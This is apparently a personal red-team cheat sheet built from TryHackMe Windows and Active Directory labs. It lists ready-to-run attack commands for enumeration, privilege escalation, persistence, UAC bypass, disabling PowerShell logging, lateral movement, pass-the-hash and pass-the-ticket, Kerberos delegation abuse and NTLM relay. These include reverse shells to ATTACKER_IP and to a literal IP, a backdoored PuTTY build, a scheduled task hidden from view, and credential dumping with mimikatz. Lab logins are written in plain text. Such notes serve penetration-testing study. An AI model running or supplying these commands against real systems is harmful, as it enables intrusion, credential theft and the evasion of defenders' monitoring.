https://www.kali.org/tools/responder/
https://github.com/dirkjanm/ldapdomaindump
https://github.com/leoloobeek/LAPSToolkit
https://github.com/SnaffCon/Snaffler
https://github.com/GhostPack/Seatbelt

## I just landed where the **** I AM ?
# Nestat
`netstat -na`
# Arp table (These IP have communicated with our system, Could be LAN or not)
`arp -a`
# Am in domain
`systeminfo | findstr Domain`
# General system information like OS version
`systeminfo`
# Whats my IP + extra info as DNS servers 
`ipconfig /all`
# IPs,Ports,Processes Corellation
`netstat -abno`
# My priviledges
`whoami /priv`
# My group
`whoami /groups`
# SMB shares
`net share`
# Other users
`net user`
# Find groups if i am in domain controller
`net group`
# Find groups 
`net localgroup `
# Users belong to administrator group
`net localgroup administrators`
# Find local settings, about password lenght, age etc
`net accounts`
# Find settings about passwords and etc (if domain controller)
`net accounts /domain`
# Enumerate users in domain
`Get-ADUser -Filter *`
`net user /domain`
`net user zoe.marshall /domain`*Specific details about user*
# Enumerate groups in domain
`net group /domain`
`net group "Tier 1 Admins" /domain`*Members of the group*
# Passwords policy
`net accounts /domain`


# Enumerate users through ldap
`Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"`
*Using the SearchBase option, we specify a specific Common-Name CN,The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN)*
# List user accounts within THM OU in the thmredteam.com Domain
`Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREADTEAM,DC=COM"`
# AV awareness-detection with wmic
`wmic /namespace:\\root\securitycenter2 path antivirusproduct`
# AV awareness-detection with pure-powershell
`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`*Windows servers may not have SecurityCenter2 namespace, but workstations have*
# Processes
`Get-Process`
# Owner of a directory
`Get-Acl c:/`
# View the permissions set on a directory
`icacls <directory>` 
# Grant a user full permissions to a directory
`icacls c:\users /grant joe:f` 
# Remove a users' permissions on a directory
`icacls c:\users /remove joe` 
# pwd
`Get-Location`
# Users with password off
`Get-LocalUser | Where-Object -Property PasswordRequired -Match false`
# Local groups
`Get-LocalGroup`
# Ports Listenning
`Get-NetTCPConnection | Where-Object -Property state -Match Listen `
# check installed updates
`wmic qfe get Caption, Description`
# Patches applied
`Get-HotFix`
`Get-Hotfix -Id KB4023834`
# Schedule Tasks
`Get-ScheduledTask -TaskName new-sched-task`
`schtasks /query /tn vulntask /fo list /v`
# Find a file in the computer
`Get-ChildItem -Path C:\ -Include *interesting-fle.txt* -File -Recurse -ErrorAction SilentlyContinue`
# Get Contents of file
`Get-Content "C:\Program Files\interestingfile.txt.txt"`

###### Privilege escalation #########
# Powershell history
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
# IIS Configuration file (passwords for databases)
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
# Retrieve Credentials from PuTTY 
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

# Scheduled Tasks
List Scheduled tasks 
`schtasks /query /tn vulntask /fo list /v`
Check the file permissions (if we can modify or overwite)
`icacls c:\tasks\schtask.bat`
Modify the file and insert the payload
`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
# Run the task
`schtasks /run /tn vulntask`

# Unquoted Service Paths
`Get-WmiObject win32_service | select Name, DisplayName, State, PathName`
*(If we find find a Path to an executable with spaces that is unqoted we win)*
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`*Generate the service executable*
`move C:\Users\thm-unpriv\reverse-svc2.exe C:\MyPrograms\Disk.exe` Move the reverseshell service to the first unqoted directory that you find in the path.
# Restart the service
`sc stop "disk sorter enterprise"
 sc start "disk sorter enterprise"`

# SeBackup / SeRestore (Pass the hash through SMB share and Registry dump)
*The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.*
`reg save hklm\system C:\Users\THMBackup\system.hive`
`reg save hklm\sam C:\Users\THMBackup\sam.hive` *Dump the registry SAM and SYSTEM hashes*
`mkdir share`
`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`*Create a share between the machines*
`copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`
`copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\` *Copy the files to the share*
`python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`*Use impacket to retrieve the users' password hashes*
`python3.9 /opt/impacket/examples/psexec.py -hashes `*Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges*
# RID Hijacking
`wmic useraccount get name,sid` Check the SID (Remember 500 is admin)
`PsExec64.exe -i -s regedit` *Run regedit as System through PsExec*
**From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID. Notice the RID is stored using little-endian notation, so its bytes appear reversed. We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):**


###### Persistence #########
`net localgroup administrators thmuser0 /add`
`net localgroup "Remote Management Users" thmuser1 /add`

# Backdooring files
`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe`

# Persisting through services
`sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto `*Create a service*

# Create Services with rev shell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice`

# Replaces Service executables

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe`
`sc.exe query state=inactive` *Find the STOPPED Services*
`sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"` *Configure it with autostart, and replace the binary with Ours*

# Scheduled Tasks

` schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM` *Create a task*
`c:\tools\pstools\PsExec64.exe -s -i regedit` *Open regedit with psexec*
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` *Navigate there and find the Schedule task that we created and delete the Security Descriptor (SD), by doing this our schedule task is invisible to everyone*


# StartUp
`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`*Place your file here for user persistence*
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` *Global persistence*

# Registry persistence
*Open registry with regedit and adequate perms*
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run` *Runs every time for the current user*
`HKLM\Software\Microsoft\Windows\CurrentVersion\Run` *Runs every time for every user*
**New -> Expandable String Value -> In the Data Section write your path to the executable,Name it as you want**

# Winlogon One method
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
*Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
Shell points to the system's shell, which is usually explorer.exe)*
(Interestingly, you can append commands separated by a comma, and Winlogon will process them all.)

# Winlogon Two method
*One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. Go to `HKCU\Environment` in the registry. New -> Expandable String Value. Name it as UserInitMprLogonScript*



#### UAC BYPASS METHODS(Run from cmd, to bypass defender) ####
`whoami /groups | find "Label"` *We want high integrity if we want to have admin perms on a process no matter if we are already an admin.If we have medium do the following* 
`set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"`
`reg add "HKCU\Software\Classes\.Servic3\Shell\Open\command" /d %CMD% /f`
`reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".Servic3" /f`
`fodhelper.exe`
`reg delete "HKCU\Software\Classes\.Servic3\" /f`
`reg delete "HKCU\Software\Classes\ms-settings\" /f`

#### Evading logging ####
# Disable Event Tracing Windows provider ( create a .ps1 and Invoke-Obfuscation)
`$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')`
`$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)`
`[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);`
# GPO takeover (create a .ps1 and Invoke-Obfuscation)
**Disable only what hurts us : 4103-Logs command invocation(module logging), 4104-Logs script block execution**
`$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')`
`$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0`
# Abusing Log Pipeline
**Disable module loggin (4103-Logs command invocation) for a particular session**
`$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false`


# Same machine Port enumeration
`
for($i=130; $i -le 140; $i++){
    Test-NetConnection localhost -Port $i
}
`
`Start-Process
Get-Process -name notepad
Copy-Item
Move-Item
`
# Download files
`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Download - Invoke-WebRequest using a Chrome User Agent
`(New-Object System.NetWebClient).Downloadfile('http://') | IEX`  *Fileless due to Invoke Expression*
`Invoke-WebRequest "http:///" -OutFile "kati.ps1" `
`certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe`
`bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe` 
`findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe` | Download from smb shared folder
`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP
# Upload Files
`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP
`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

# Signed Binary Proxy Execution - Indirect Command Execution
`explorer.exe /root,"C:\Windows\System32\calc.exe"` (Indirect Command Execution)
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");`(Signed Binary Proxy Execution: Rundll32)

# Bypassing Application Whitelisting (Regsvr32- DLL)
`c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll` *First Option*
`c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll` *More advanced - Second Option*

# Run powershell with MSBuild! NO powershell.exe (Can also exec shellcode the same way)
`git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git`
`msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1`
`msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"`
`python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj`
`c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj`

# ExecutionPolicy Bypass
`powershell -ExecutionPolicy Bypass -File .\kati`

# Other machine discovery 
`1..255 | %{echo "10.0.2.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}`

# Other machines Open ports
`1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null`

# Powerview
`
powershell -ExecutionPolicy bypass -file .\powerview.ps1
Import-Module .\powerview.ps1
Get-NetUser -Properties description
Get-NetUser -Properties useraccountcontrol
Get-NetUser -Properties useraccountcontrol | findstr ACCOUNTDISABLE
Get-NetGroupMember “Domain Admins”
Find-DomainShare
Get-NetGPO
`
MS Defender works in three protection modes: Active, Passive, Disable modes.Active mode is used where the MS Defender runs as the primary antivirus software on the machine where provides protection and remediation. Passive mode is run when a 3rd party antivirus software is installed. Therefore, it works as secondary antivirus software where it scans files and detects threats but does not provide remediation. Finally, Disable mode is when the MS Defender is disabled or uninstalled from the system.
# Check the service state for windows
`Get-Service WinDefend`
# Check to see the option that enabled or disable on AV
`Get-MpComputerStatus`
Optional: `| select RealTimeProtectionEnabled`
# Lets check about Firewall
`Get-NetFirewallProfile`
Optional quick check:`| Format-Table Name, Enabled`
# Check about firewall rules
`Get-NetFirewallRule | select DisplayName, Enabled, Direction , Action`
# Disable Firewall profile (if admin perms)
`Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False`
# Test connections for (inbound connection-ports open-other computers in the network)
`Test-NetConnection -ComputerName 127.0.0.1 -Port 80`
`(New-Object System.Net.Sockets.TcpClient("127.0.0.1","80").Connected)`
# Get Event logs (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)
`Get-EventLog -List`
*Through this we can get an insight of what applications and services run on the machine*
# Check if sysmon is present on our machine (So potentially logging things)
`Get-Process | Where-Object { $_.ProcessName -eq "Sysmon"}`
`Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"`
`Get-Service | where-object {$_.DisplayName -like "*sysm*"}`
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational`
# Find the sysmon configuration file (So as to see what is being monitored, BECAREFULL IT MAY TRIGGER AV)
`findstr /si '<ProcessCreate onmatch="exclude">' C:\*`
# EDR checker
https://github.com/PwnDexter/SharpEDRChecker
# Check for installed applications and versions
`wmic product get name,version,vendor`
# Check for running Services
`net start`
# Find Specific service of interest
`wmic service where "name like 'THM Service'" get name,PathName`
`Get-Process -Name thm-service`
`nestat -aon |findstr "LISTENING" | findstr "3212"`
# DNS zone transfer
`nslookup.exe
server myIp
ls -d DomainName`
**or**
`dig -t AXFR DOMAIN_NAME @DNS_SERVER` **The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME**
# Simple Network Management Protocol (SNMP) [Need more tools like snmpwalk to add to this toolset]
*Designed to help collect information about different devices on the network.*
`git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
snmpcheck.rb 10.10.235.90 -c COMMUNITY_STRING`
*or*
`snmpwalk -v1 -c public 10.10.114.235`
**Community string is default some times to Public, but it can be found on other devices like routers and etc.The “SNMP community string” is like a user ID or password that allows access to a router's or other device's statistics.**

# Force GPO sync
`gpupdate /force`


# LDAP Pass-back Attacks
LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified.We can alter the LDAP configuration, such as the IP or hostname of the LDAP server to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

# Setup an LDAP server
`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
`sudo dpkg-reconfigure -p low slapd`
*Omit OpenLDAP server configuration -> No*
*DNS domain name,Organisation name -> Attacking.domain.com*
*Provide admin pass*
*Remove when purged -> No*
*Move old Database-> yes*

# Make our server to only support PLAIN and LOGIN authentication methods
*Create a file with name -> olcSaslSecProps.ldif*
*Write that in file*
`
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
`
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`*Configure*
`sudo tcpdump -SX -i eth0 tcp port 389`*Capture traffic on ldap server and check the credentials*


# Responder
Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond.Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication. 
`sudo responder -I tun0`

# PXE Boot - LAPS (https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)

# Enumeration with Seatbelt (https://github.com/GhostPack/Seatbelt)

# Runas (not domain joined )
When the PC is not joined to the domain and we have AD credentials we can use Runas to inject the credentials into memory.So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the domain account specified. 
`runas.exe /netonly /user:<domain>\<username> cmd.exe`

# Setup DNS in case its not automatically done (Powershell)
`$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip` *Most of the times DC will be the dns server*

# SYSVOL 
`dir \\za.tryhackme.com\SYSVOL`*Kerberos authentication*
`dir \\<DC IP>\SYSVOL ` *Stealthier NTLM authentication*

###############################################
ssh za.tryhackme.com\\grace.brooks@thmjmp1.za.tryhackme.com -> Vrgr6062
xfreerdp /v:thmjmp1.za.tryhackme.com /u:grace.brooks /d:za.tryhackme.com /p:Vrgr6062 /dynamic-resolution


################################################

## Install RSAT Tools and perform enumeration (oriaka gia petama)

`Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online` *Install them*
# Enumerate user
`Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *`
# Enumerate Groups
`Get-ADGroup -Identity Administrators -Server za.tryhackme.com`
# ENumerate group membership
`Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`

# Sharphound
`.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
` *Collect all but do not touch domain controllers- Theoretically evasive*
`neo4j console` Start neo4j
`bloodhound`

# PSexec (remote command exec)
    Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
    Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
    Create some named pipes to handle stdin/stdout/stderr.

`psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`

### Common code for the above tecniques
`$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`

`smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever` *Upload what you want to execute on the shares (depends on the method you choose)*

# WinRM remote exec(required: Remote Management Users group- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd` *One way*
`Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`

# WMI remote powershell through DCOM (port 135/TCP and ports 49152-65535/TCP)
`$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`

# WMI remote Process Creating
`$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}`

# WMI remote services
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete`

# WMI remote scheduled tasks
`$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"`
# WMI remote MSI installation
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

# sc.exe (Remote services)
`sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto`
`sc.exe \\TARGET start THMservice`
`sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice`

# Schedule task (remote run)
`schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 `
`schtasks /s TARGET /run /TN "THMtask1" `
`schtasks /S TARGET /TN "THMtask1" /DELETE /F`

## PASS THE HASH
# PTH with mimikatz
*Admin privs*
`privilege::debug`
`token::elevate`
`sekurlsa::msv`
`token::revert`
`sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"`*if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH*

# PTH RDP
`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
# PTH ps.exec
`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`(linux version)
# PTH evil-winrm
`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`


## PASS THE TICKET
*TGT cant be exported with admin priv, TGS with low priv*
`privilege::debug`
`sekurlsa::tickets /export`
`kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
`*inject the ticket in the current session*
`klist`*Running this in powershell will show cached-injected cred*


## PASS THE KEY
`privilege::debug`
`sekurlsa::ekeys`
`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"`*When using RC4 instead of AES and etc, the key will be equal to the NTLM hash,we can use it to request a TGT- Known as Overpass-the-Hash (OPtH)*

# RDP hijacking(without password before Windows server 2019)
`PsExec64.exe -s cmd.exe`*Get system priv*
`query user` *Check for State :disc*
`tscon 3 /dest:rdp-tcp#6`*Session 3 with is disc should be connected to our: tcp#6*

# Reverse Shell 

`$client = New-Object System.Net.Sockets.TCPClient('10.50.112.55',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
` 

# Permission Delegation (ACE's)
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#

    ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
    AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
    GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
    GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
    WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
    WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
    AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

## AD-RSAT for permision delegation
# Add-ADGroupMember 
`$user = Get-ADUser -Identity 'user.name'
$group = Get-ADGroup -Identity 'IT Support'
Add-ADGroupMember -Identity $group -Members $user
Get-ADGroupMember -Identity $group`

# Check the members of a group
`Get-ADGroupMember -Identity "IT Support`

# # Pick a random T2 account to target
`$t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1`

# Change the password
`$password = 'strong.pass1' | ConvertTo-SecureString -AsPlainText -Force
Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password`

**If you get an access denied error, your membership of the IT Support group have not fully replicated through the network yet. Try running gpupdate /force or wait a few minutes and try again.**

## Kerberos unconstrained delegation computers
# Enumeration for delegation(AD-RSAT)
`Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description`

# Powerview find for delegations
`Import-Module C:\Tools\PowerView.ps1 `
`Get-NetUser -TrustedToAuth` *full enumeration! userprincipalname: (the service), msds-allowedtodelegateto: (the services it can delegate)*

# Check for if potential service exists so we can dump cred later on 
`Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object *`**

# MIMIKATZ: Dump clear text credentials (for services)from registry
`mimikatz # token::elevate`*Elevate System privs*
`mimikatz # lsadump::secrets`*Dump clear text cred from registry for features such as Windows services*
`mimikatz # token::revert`*revert the priv*

# kekeo: Generate TGT for services
`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
*user - The user who has the constrained delegation permissions.
domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
password - The password associated with the svcIIS account.*


# kekeo: Generate TGS (for both services)
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http`
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`

# mimikatz  import the two TGS
`mimikatz # privilege::debug`
`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`

`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`

# Check if the PSsession exists
`New-PSSession -ComputerName thmserver1.za.tryhackme.loc`

# Get RCE on the server
`Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`


## Authentication relays

Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the following four conditions :

    A valid set of AD account credentials.
    Network connectivity to the target's SMB service.
    The target host must be running the Print Spooler service.
    The hosts must not have SMB signing enforced.

# Enumerate for Print Spoller service
`GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
` *or*
`Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`

# Ensure SMB signing is not enforced
`nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`

# Find the IP of the server
`dig thmserver1.za.tryhackme.loc`

# Setup NTLM relay
`python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug`

# Coerce A server to authenticate to us (we are on thmwrk1)        
`C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

# Get hash dump from server1 (i think xD)
` python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP"`


## Exploiting GPOs

# Adding an AD account we control to both the local Administrators and local Remote Desktop Users groups.

`C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe`*inject the AD user's credentials into memory using the runas command*

`C:\>mmc`*open MMC to modify the GPO*

We now want to add the Group Policy Management snap-in:

    Click File -> Add/Remove Snap-in
    Select the Group Policy Management snap-in and click Add
    Click Ok

You should now be able to see GPOs for the za.tryhackme.com domain:
We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes).
We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window.
In order to add our account to the local groups, we need to perform the following steps:

    Expand Computer Configuration
    Expand Policies
    Expand Windows Settings
    Expand Security Settings
    Right Click on Restricted Groups and select Add Group (If the IT Support group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
    Click Browse, enter IT Support and  click Check Names
    Click Okay twice
The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users groups. 
Once the configuration has been made, we can click Apply and OK. Now, all we need to do is wait for a maximum of 15 minutes for the GPO to be applied. After this, our initial account that we made a member of the IT Support group will now have administrative and RDP permissions on THMSERVER2!

## Bloodhound extra queries
# Bloodhound custom query to find admin access from one machine to another
`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
